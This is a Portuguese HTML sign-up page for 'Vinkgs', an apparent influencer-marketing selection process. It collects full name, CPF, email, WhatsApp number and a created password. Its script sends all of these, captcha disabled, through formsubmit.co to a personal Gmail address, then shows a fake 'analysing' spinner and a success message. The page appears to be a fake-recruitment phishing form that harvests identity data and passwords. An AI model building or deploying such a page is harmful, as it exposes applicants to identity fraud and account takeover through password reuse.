<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Cadastro de Seleção</title>

  <style>
    body {
      font-family: Arial, Helvetica, sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      padding: 30px;
    }

    .form-container {
      background: #ffffff;
      padding: 30px;
      max-width: 420px;
      margin: auto;
      border-radius: 14px;
      box-shadow: 0 15px 40px rgba(0,0,0,0.3);
      text-align: center;
    }

    .brand-name {
      font-size: 26px;
      font-weight: bold;
      color: #2c5364;
      margin-bottom: 4px;
    }

    .brand-sub {
      font-size: 14px;
      letter-spacing: 1px;
      color: #666;
      text-transform: uppercase;
      margin-bottom: 18px;
    }

    .subtitle {
      font-size: 14px;
      color: #777;
      margin-bottom: 22px;
    }

    input, button {
      width: 100%;
      padding: 13px;
      margin-top: 12px;
      border-radius: 8px;
      border: 1px solid #d0d0d0;
      font-size: 15px;
    }

    input:focus {
      outline: none;
      border-color: #2c5364;
    }

    button {
      background: #2c5364;
      color: white;
      border: none;
      cursor: pointer;
      font-weight: bold;
      margin-top: 18px;
      transition: 0.3s;
    }

    button:hover {
      background: #203a43;
    }

    .hidden {
      display: none;
    }

    .spinner {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #2c5364;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 25px auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>

<body>

  <div class="form-container">

    <!-- CADASTRO -->
    <div id="cadastroDiv">
      <div class="brand-name">Vinkgs</div>
      <div class="brand-sub">Marketing de Influência</div>
      <div class="subtitle">Cadastro para participação no processo de seleção</div>

      <form id="cadastro">
        <input type="text" name="nome" placeholder="Nome completo" required>

        <input type="text"
               name="cpf"
               placeholder="CPF (000.000.000-00)"
               maxlength="14"
               required
               oninput="mascaraCPF(this)">

        <input type="email" name="email" placeholder="E-mail para contato" required>

        <input type="text" name="whatsapp" placeholder="WhatsApp com DDD" required>

        <input type="password" name="senha" placeholder="Criar senha de acesso" required>

        <input type="password" name="confirmaSenha" placeholder="Confirmar senha" required>

        <button type="submit">Enviar Cadastro</button>
      </form>
    </div>

    <!-- LOADING -->
    <div id="loading" class="hidden">
      <p>Analisando informações...</p>
      <div class="spinner"></div>
    </div>

    <!-- SUCESSO -->
    <div id="sucesso" class="hidden">
      <h2>Cadastro recebido</h2>
      <p>Seus dados foram enviados com sucesso.</p>
      <p><strong>Se aprovado, entraremos em contato.</strong></p>
    </div>

  </div>

  <script>
    function mascaraCPF(cpf) {
      cpf.value = cpf.value
        .replace(/\D/g, '')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    }

    document.getElementById('cadastro').addEventListener('submit', function(e) {
      e.preventDefault();

      const form = this;
      const senha = form.senha.value;
      const confirma = form.confirmaSenha.value;

      if (senha !== confirma) {
        alert('As senhas não coincidem.');
        return;
      }

      document.getElementById('cadastroDiv').classList.add('hidden');
      document.getElementById('loading').classList.remove('hidden');

      const formData = new FormData(form);
      formData.append('_captcha', 'false');
      formData.append('_subject', 'Novo Cadastro de Candidato - Vinkgs');

      fetch('https://formsubmit.co/natanaelverissimo34@gmail.com', {
        method: 'POST',
        body: formData
      }).then(() => {
        setTimeout(() => {
          document.getElementById('loading').classList.add('hidden');
          document.getElementById('sucesso').classList.remove('hidden');
        }, 2000);
      });
    });
  </script>

</body>
</html>
